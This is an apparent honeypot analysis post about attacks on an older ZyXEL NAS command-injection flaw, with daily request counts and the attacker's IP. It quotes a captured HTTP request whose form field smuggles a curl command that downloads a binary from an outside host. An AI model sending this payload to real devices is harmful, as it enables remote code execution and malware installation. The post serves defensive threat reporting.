Yesterday, I talked about attacks against a relatively recent D-Link NAS vulnerability. Today, scanning my honeypot logs, I found an odd URL that I didn't recognize. The vulnerability is a bit older but turns out to be targeting yet another NAS.

The sample request:

POST /cmd,/ck6fup6/portal\_main/pkg\_init\_cmd/register\_main/setCookie HTTP/1.0
User-Agent: Baidu
Accept: \*/\*
Content-Length: 73
Content-Type: application/x-www-form-urlencoded
Host: [redacted]

pkgname=myZyXELcloud-Agent&cmd=%3bcurl%2089.190.156.248/amanas2&content=1

The exploit is simple: attempt to download and execute the "amanas2" binary and execute it. Sadly, I was not able to retrieve the file. Virustotal does show the URL as malicious for a couple of anti-malware tools [1]

Oddly, I am seeing this pattern only the last couple days, even though the vulnerability and the PoC were disclosed last year [2]:

|  |  |
| --- | --- |
| **Date** | **Count** |
| April 27th | 56 |
| April 28th | 1530 |
| April 29th | 899 |
| April 30th | 749 |

Based on our logs, only one IP address exploits the vulnerability: %%ip: 89.190.156.248%%. The IP started scanning a couple of days earlier for index pages and "jeecgFormDemoController.do, likely attempting to exploit a deserialization vulnerability in jeecgFormDemoController
